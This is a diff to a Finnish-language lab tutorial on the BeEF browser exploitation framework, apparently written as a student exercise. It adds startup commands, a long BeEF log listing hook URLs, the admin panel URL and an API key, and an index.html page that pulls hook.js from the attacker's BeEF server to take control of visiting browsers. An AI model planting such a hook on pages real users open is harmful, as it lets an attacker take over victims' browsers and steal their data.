@@ -22,13 +22,10 @@ BeEF on kuin puhas/ei vuoda tietojen käyttöliittymä järjestelmä hyökkäyks
 
 <details>
 
-asdf
 ![Alt text](images_beef/beef-2.PNG)
     
-werth
 ![Alt text](images_beef/beef-3.PNG)
 
-vcbn
 ![Alt text](images_beef/beef-4.PNG)
 
 </details>
@@ -151,6 +148,75 @@ Nämä kertovat, mitä scriptiä tullaan käyttää, ja miten päästää siihen
 myös vastaavasti, jos ei käytetä enään `BeEF` hakkeri työkalua niin sammuttaminen menee `beef-xss-stop -h`
 ![Alt text](beef-harj/beef-4.PNG)
 
+myös meitä kiinnostaa tämän BeEF käyttöjärjestelmän sen yksittäisen kiinteän IP-osoite, vähä kuin jos ladannut tiettyä palvelinta tai jotakn järjestelmän sovellusta niin tulee mukaan jokin IP-osoite, ja usein oletuksena alkaa aina 192.168.X.Y jotakin. Eli mene `$root`:iin, ja mene polkuun `cd /usr/share/beef` ja toista `$./beef`
+
+```
+┌──(root㉿kali)-[/usr/share/beef-xss]
+└─# ./beef
+[10:48:33][*] Browser Exploitation Framework (BeEF) 0.5.4.0
+[10:48:33]    |   Twit: @beefproject
+[10:48:33]    |   Site: https://beefproject.com
+[10:48:33]    |   Blog: http://blog.beefproject.com
+[10:48:33]    |_  Wiki: https://github.com/beefproject/beef/wiki
+[10:48:33][*] Project Creator: Wade Alcorn (@WadeAlcorn)
+-- migration_context()
+   -> 0.0090s
+[10:48:34][*] BeEF is loading. Wait a few seconds...
+[10:48:34][!] [AdminUI] Error: Could not minify 'BeEF::Extension::AdminUI::API::Handler' JavaScript file: Invalid option: harmony
+[10:48:34]    |_  [AdminUI] Ensure nodejs is installed and `node' is in `$PATH` !
+[10:48:34][!] [AdminUI] Error: Could not minify 'BeEF::Extension::AdminUI::API::Handler' JavaScript file: Invalid option: harmony
+[10:48:34]    |_  [AdminUI] Ensure nodejs is installed and `node' is in `$PATH` !
+[10:48:34][*] 8 extensions enabled:
+[10:48:34]    |   XSSRays
+[10:48:34]    |   Social Engineering
+[10:48:34]    |   Requester
+[10:48:34]    |   Proxy
+[10:48:34]    |   Network
+[10:48:34]    |   Events
+[10:48:34]    |   Demos
+[10:48:34]    |_  Admin UI
+[10:48:34][*] 309 modules enabled.
+[10:48:34][*] 2 network interfaces were detected.
+[10:48:34][*] running on network interface: 127.0.0.1
+[10:48:34]    |   Hook URL: http://127.0.0.1:3000/hook.js
+[10:48:34]    |_  UI URL:   http://127.0.0.1:3000/ui/panel
+[10:48:34][*] running on network interface: 192.168.240.130
+[10:48:34]    |   Hook URL: http://192.168.X.Y:3000/hook.js
+[10:48:34]    |_  UI URL:   http://192.168.X.Y:3000/ui/panel
+[10:48:34][*] RESTful API key: 4543a94b14cbc57e740ace182fcbadef140925c3
+[10:48:34][!] [GeoIP] Could not find MaxMind GeoIP database: '/var/lib/GeoIP/GeoLite2-City.mmdb'
+[10:48:34]    |_  Run geoipupdate to install
+[10:48:34][*] HTTP Proxy: http://127.0.0.1:6789
+#<Thread:0x00007f94509bbd38 /usr/share/beef-xss/extensions/proxy/api.rb:16 run> terminated with exception (report_on_exception is true):
+/usr/share/beef-xss/extensions/proxy/proxy.rb:20:in `initialize': Address already in use - bind(2) for "127.0.0.1" port 6789 (Errno::EADDRINUSE)
+        from /usr/share/beef-xss/extensions/proxy/proxy.rb:20:in `new'
+        from /usr/share/beef-xss/extensions/proxy/proxy.rb:20:in `initialize'
+        from /usr/share/beef-xss/extensions/proxy/api.rb:18:in `new'
+        from /usr/share/beef-xss/extensions/proxy/api.rb:18:in `block (2 levels) in pre_http_start'
+        from /usr/share/beef-xss/extensions/proxy/api.rb:17:in `synchronize'
+        from /usr/share/beef-xss/extensions/proxy/api.rb:17:in `block in pre_http_start'
+[10:48:34][*] BeEF server started (press control+c to stop)
+[10:48:34][!] Another process is already listening on port 3000, or you're trying to bind BeEF to an invalid IP.
+[10:48:34][!] Is BeEF already running? Exiting...
+```
+
+<h3>index.html</h3>
+
+luo tyhjä index html sivusto esim. alemman mukaan formaatti, tohon IP-osoite tulee se beef työkalun sen kiinte IP-osoite eli ylemmän `./beef` komennon mukaan mitä se ehdottaa ladatun järjestelmän mukaan, ja oletuksena vähä kuin kali linux lähellä sitä IP-osoitetta.
+
+```
+<html>
+  <head>
+    <title>BEEF HACKING</title>
+      <script src="http://<beef-ip-add>:3000/hook.js"></script>
+  </head>
+  <body>
+    <h1>YOU HAVE BEEN HACKED!!!</h1>
+        <h2>moi miten menee muuten?</h2>
+  </body>
+</html>
+
+```
 
 <hr>
 
